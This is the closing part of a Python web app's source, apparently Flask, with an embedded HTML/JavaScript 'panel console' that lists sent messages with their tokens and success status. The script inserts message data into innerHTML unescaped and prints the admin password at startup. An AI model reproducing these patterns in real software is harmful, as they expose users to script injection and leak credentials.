                    messages.reverse().forEach(msg => {
                        const statusClass = msg.status === 'success' ? 'message-success' : 'message-failed';
                        const statusText = msg.status === 'success' ? 'SUCCESS' : 'FAILED';
                        
                        const messageItem = document.createElement('div');
                        messageItem.className = `message-item ${statusClass}`;
                        messageItem.innerHTML = `
                            <div class="message-header">
                                <span class="message-time">${msg.timestamp}</span>
                                <span class="message-token">${msg.token}</span>
                            </div>
                            <div class="message-content">${msg.message}</div>
                            <div class="message-status status-${msg.status}">
                                ${statusText} - ${msg.type}
                            </div>
                        `;
                        container.appendChild(messageItem);
                    });
                });
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            createQuantumParticles();
            toggleTokenInput();
            
            // Auto-refresh messages every 8 seconds
            setInterval(loadMessages, 8000);
            loadMessages();
        });
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    print(f"🌌 PANEL CONSOLE starting on port {port}...")
    print(f"🔐 Admin Password: {admin_password}")
    print("🚀 Quantum system ready for elite operations!")
    app.run(host='0.0.0.0', port=port, debug=False)
